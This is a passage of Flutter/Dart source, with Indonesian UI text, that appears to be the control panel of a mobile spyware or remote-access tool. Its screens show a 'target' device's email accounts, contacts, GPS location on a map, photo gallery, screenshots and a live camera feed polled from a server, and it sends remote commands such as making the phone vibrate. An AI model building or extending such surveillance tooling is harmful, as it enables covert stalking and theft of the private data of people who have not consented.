                end: Alignment.bottomCenter,
                colors: [glassTop, glassBottom],
              ),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
              border: Border.all(color: glassBorder, width: 1),
            ),
            child: ListView(
              padding: const EdgeInsets.all(20),
              children: accounts.map((acc) => Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.03),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: glassBorder),
                ),
                child: ListTile(
                  leading: const Icon(Icons.email, color: accentRed),
                  title: Text(acc['email'] ?? '-', style: const TextStyle(color: textMain)),
                ),
              )).toList(),
            ),
          ),
        ),
      ),
    );
  }

  void _showContactsBottomSheet(Map<String, dynamic> data) {
    final contacts = data['contacts'] as List? ?? [];
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (context) => ClipRRect(
        borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
          child: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [glassTop, glassBottom],
              ),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(28)),
              border: Border.all(color: glassBorder, width: 1),
            ),
            child: ListView(
              padding: const EdgeInsets.all(20),
              children: contacts.map((c) => Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.03),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: glassBorder),
                ),
                child: ListTile(
                  leading: const Icon(Icons.contact_phone, color: warningColor),
                  title: Text(c['name'] ?? '-', style: const TextStyle(color: textMain)),
                  subtitle: Text(c['number'] ?? '-', style: const TextStyle(color: textSub)),
                ),
              )).toList(),
            ),
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _logScrollController.dispose();
    _cameraFrameStreamController.close();
    _galleryStreamController.close();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, color: Colors.white, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        centerTitle: true,
        title: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Text(
              "Control Panel",
              style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16, fontFamily: 'Pek'),
            ),
            const SizedBox(width: 6),
            Container(
              width: 6,
              height: 6,
              decoration: BoxDecoration(
                color: _isConnected ? successColor : errorColor,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: (_isConnected ? successColor : errorColor).withOpacity(0.5),
                    blurRadius: 6,
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
      body: _buildControlTab(),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════
// LOCATION FULLSCREEN PAGE (MAP VERSION)
// ════════════════════════════════════════════════════════════════════════
class LocationFullscreenPage extends StatelessWidget {
  final String targetModel;
  final Map<String, dynamic> locationData;

  const LocationFullscreenPage({
    Key? key,
    required this.targetModel,
    required this.locationData,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final double? lat = locationData['lat'];
    final double? lng = locationData['lng'];
    final String address = locationData['fullAddress'] ?? 
      (lat != null && lng != null ? '$lat, $lng' : 'Tidak ada data');

    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, color: Colors.black, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        centerTitle: true,
        title: Text(
          "Location",
          style: TextStyle(color: Colors.black87, fontWeight: FontWeight.bold, fontSize: 18, fontFamily: 'Pek'),
        ),
      ),
      body: Stack(
        children: [
          if (lat != null && lng != null)
            Positioned.fill(child: _buildMapView(lat, lng))
          else
            Positioned.fill(
              child: Container(
                color: Colors.grey[200],
                child: const Center(
                  child: Text("Lokasi tidak tersedia", style: TextStyle(color: Colors.grey)),
                ),
              ),
            ),

          Positioned(
            bottom: 20,
            left: 16,
            right: 16,
            child: Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.white,
                border: Border.all(color: Colors.black, width: 2.5),
                boxShadow: [BoxShadow(color: Colors.black, offset: Offset(4, 4), blurRadius: 0)],
                borderRadius: BorderRadius.circular(20),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                        decoration: BoxDecoration(
                          color: Colors.white,
                          border: Border.all(color: Colors.black, width: 2.5),
                          boxShadow: [BoxShadow(color: Colors.black, offset: Offset(4, 4), blurRadius: 0)],
                          borderRadius: BorderRadius.circular(8),
                        ),
                        child: Text(
                          "BRAND",
                          style: TextStyle(color: Colors.grey, fontSize: 10, fontWeight: FontWeight.bold, fontFamily: 'Pek'),
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          targetModel,
                          style: TextStyle(color: Colors.black87, fontWeight: FontWeight.bold, fontSize: 16, fontFamily: 'Pek'),
                        ),
                      ),
                      Container(
                        width: 40,
                        height: 40,
                        decoration: BoxDecoration(
                          color: const Color(0xFFFFF3E0),
                          border: Border.all(color: Colors.black, width: 2.5),
                          borderRadius: BorderRadius.circular(20),
                        ),
                        child: const Center(
                          child: Icon(Icons.location_on, color: Color(0xFFFF9800), size: 24),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                        decoration: BoxDecoration(
                          color: Colors.white,
                          border: Border.all(color: Colors.black, width: 2.5),
                          boxShadow: [BoxShadow(color: Colors.black, offset: Offset(4, 4), blurRadius: 0)],
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: Text(
                          "OFFLINE",
                          style: TextStyle(color: Colors.grey, fontSize: 10, fontWeight: FontWeight.bold, fontFamily: 'Pek'),
                        ),
                      ),
                      const SizedBox(width: 8),
                      Text(
                        DateTime.now().toLocal().toString().substring(0, 16).replaceAll('-', '/'),
                        style: TextStyle(color: Colors.grey, fontSize: 10, fontFamily: 'Pek'),
                      ),
                    ],
                  ),
                  const SizedBox(height: 16),
                  Row(
                    children: [
                      _buildInfoItem("IP Address", "-"),
                      const SizedBox(width: 8),
                      _buildInfoItem("Device ID", locationData['deviceId'] ?? "-"),
                      const SizedBox(width: 8),
                      _buildInfoItem("Brand", targetModel),
                    ],
                  ),
                  const SizedBox(height: 16),
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: Colors.white,
                      border: Border.all(color: Colors.black, width: 2.5),
                      boxShadow: [BoxShadow(color: Colors.black, offset: Offset(4, 4), blurRadius: 0)],
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Row(
                      children: [
                        const Icon(Icons.location_on_outlined, color: Colors.grey, size: 16),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            address,
                            style: TextStyle(color: Colors.black87, fontSize: 12, fontFamily: 'Pek'),
                            maxLines: 2,
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 16),
                  Row(
                    children: [
                      Expanded(
                        child: ElevatedButton.icon(
                          onPressed: () async {
                            final prefs = await SharedPreferences.getInstance();
                            final token = prefs.getString('key') ?? '';
                            
                            await http.post(
                              Uri.parse("$baseUrl/api/command/${locationData['deviceId']}"),
                              headers: {
                                "Content-Type": "application/json",
                                "x-auth-token": token,
                              },
                              body: jsonEncode({
                                "command": "vibrate",
                                "value": "5000",
                              }),
                            );

                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text("Menggetarkan device..."), duration: Duration(seconds: 1)),
                            );
                          },
                          icon: const Icon(Icons.wb_sunny_outlined, size: 16),
                          label: const Text("Wake Up"),
                          style: ElevatedButton.styleFrom(
                            side: const BorderSide(color: Colors.black, width: 2.5),
                            backgroundColor: const Color(0xFFFFF8E1),
                            foregroundColor: const Color(0xFFFF9800),
                            elevation: 0,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                              side: const BorderSide(color: Colors.black, width: 2.5),
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: ElevatedButton.icon(
                          onPressed: () {},
                          icon: const Icon(Icons.delete_outline, size: 16),
                          label: const Text("Delete"),
                          style: ElevatedButton.styleFrom(
                            side: const BorderSide(color: Colors.black, width: 2.5),
                            backgroundColor: const Color(0xFFFFEBEE),
                            foregroundColor: const Color(0xFFF44336),
                            elevation: 0,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                              side: const BorderSide(color: Colors.black, width: 2.5),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMapView(double lat, double lng) {
    final String mapUrl =
        "https://www.openstreetmap.org/export/embed.html?bbox=${lng-0.005},${lat-0.005},${lng+0.005},${lat+0.005}&layer=mapnik&marker=$lat,$lng";

    final controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse(mapUrl));

    return WebViewWidget(controller: controller);
  }

  Widget _buildInfoItem(String label, String value) {
    return Expanded(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            label,
            style: TextStyle(color: Colors.grey, fontSize: 10, fontFamily: 'Pek'),
          ),
          const SizedBox(height: 4),
          Text(
            value,
            style: TextStyle(color: Colors.black87, fontSize: 12, fontWeight: FontWeight.w500, fontFamily: 'Pek'),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
        ],
      ),
    );
  }
}

// ─── WIDGET LAINNYA ─────────────────────────────────────────────────
class ScreenshotResultPage extends StatelessWidget {
  final String targetModel;
  final String screenshotFrame;
  final String screenshotFacing;
  final VoidCallback onClose;
  const ScreenshotResultPage({Key? key, required this.targetModel, required this.screenshotFrame, required this.screenshotFacing, required this.onClose}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: Text("KAMERA ${screenshotFacing.toUpperCase()}", style: const TextStyle(fontSize: 14)),
        backgroundColor: Colors.transparent,
        foregroundColor: Colors.white,
        elevation: 0,
        leading: IconButton(icon: const Icon(Icons.close, size: 20), onPressed: onClose),
      ),
      body: Center(
        child: InteractiveViewer(
          minScale: 0.5,
          maxScale: 3.0,
          child: Image.memory(base64Decode(screenshotFrame.split(',').last)),
        ),
      ),
    );
  }
}

class GalleryFullscreenPage extends StatelessWidget {
  final String targetId;
  final String targetModel;
  final Stream<List<Map<String, dynamic>>> galleryStream;
  final VoidCallback onClose;
  final VoidCallback onRefresh;
  final Function(String) onDownload;

  const GalleryFullscreenPage({Key? key, required this.targetId, required this.targetModel, required this.galleryStream, required this.onClose, required this.onRefresh, required this.onDownload}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Galeri", style: TextStyle(fontSize: 16)),
        backgroundColor: bgSurface,
        foregroundColor: Colors.white,
        leading: IconButton(icon: const Icon(Icons.close, size: 20), onPressed: onClose),
      ),
      backgroundColor: bgMain,
      body: StreamBuilder<List<Map<String, dynamic>>>(
        stream: galleryStream,
        builder: (context, snapshot) {
          if (!snapshot.hasData) return const Center(child: CircularProgressIndicator(color: accentBlue));
          final photos = snapshot.data!;
          if (photos.isEmpty) return const Center(child: Text("Tidak ada foto", style: TextStyle(color: textSub)));
          return GridView.builder(
            padding: const EdgeInsets.all(8),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 6, mainAxisSpacing: 6),
            itemCount: photos.length,
            itemBuilder: (context, index) {
              final thumb = photos[index]['thumb'] ?? '';
              return GestureDetector(
                onTap: () {
                  showDialog(
                    context: context,
                    builder: (context) => Dialog(
                      backgroundColor: Colors.transparent,
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(16),
                        child: Image.memory(base64Decode(thumb.split(',').last)),
                      ),
                    ),
                  );
                },
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(8),
                  child: Image.memory(base64Decode(thumb.split(',').last), fit: BoxFit.cover),
                ),
              );
            },
          );
        },
      ),
    );
  }
}

class LiveCameraPollingPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Function(String) onSwitchCamera;
  const LiveCameraPollingPage({Key? key, required this.targetId, required this.targetModel, required this.facing, required this.onClose, required this.onSwitchCamera}) : super(key: key);

  @override
  State<LiveCameraPollingPage> createState() => _LiveCameraPollingPageState();
}

class _LiveCameraPollingPageState extends State<LiveCameraPollingPage> {
  String _currentFrame = '';
  String _currentFacing = '';
  Timer? _pollingTimer;

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    _fetchFrame();
    _pollingTimer = Timer.periodic(const Duration(seconds: 2), (timer) => _fetchFrame());
  }

  Future<void> _fetchFrame() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      final response = await http.get(
        Uri.parse("$baseUrl/api/live-camera/${widget.targetId}?facing=$_currentFacing"),
        headers: {"x-auth-token": token},
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && mounted) setState(() => _currentFrame = data['frame']);
      }
    } catch (_) {}
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    widget.onClose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text("Live Camera", style: TextStyle(fontSize: 16)),
        backgroundColor: Colors.transparent,
        foregroundColor: Colors.white,
        leading: IconButton(icon: const Icon(Icons.close, size: 20), onPressed: () => Navigator.pop(context)),
      ),
      body: _currentFrame.isNotEmpty
          ? Center(child: Image.memory(base64Decode(_currentFrame.split(',').last)))
          : const Center(child: CircularProgressIndicator(color: accentBlue)),
    );
  }
}

class FileManagerFullscreenPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final VoidCallback onClose;
  final Future<void> Function(String, {String? extra}) sendCommand;
  const FileManagerFullscreenPage({Key? key, required this.targetId, required this.targetModel, required this.onClose, required this.sendCommand}) : super(key: key);

  @override
  State<FileManagerFullscreenPage> createState() => _FileManagerFullscreenPageState();
}

class _FileManagerFullscreenPageState extends State<FileManagerFullscreenPage> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("File Manager", style: TextStyle(fontSize: 16)),
        backgroundColor: bgSurface,
        foregroundColor: Colors.white,
        leading: IconButton(icon: const Icon(Icons.close, size: 20), onPressed: widget.onClose),
      ),
      body: const Center(child: Text("Fitur File Manager di sini", style: TextStyle(color: textSub))),
    );
  }
}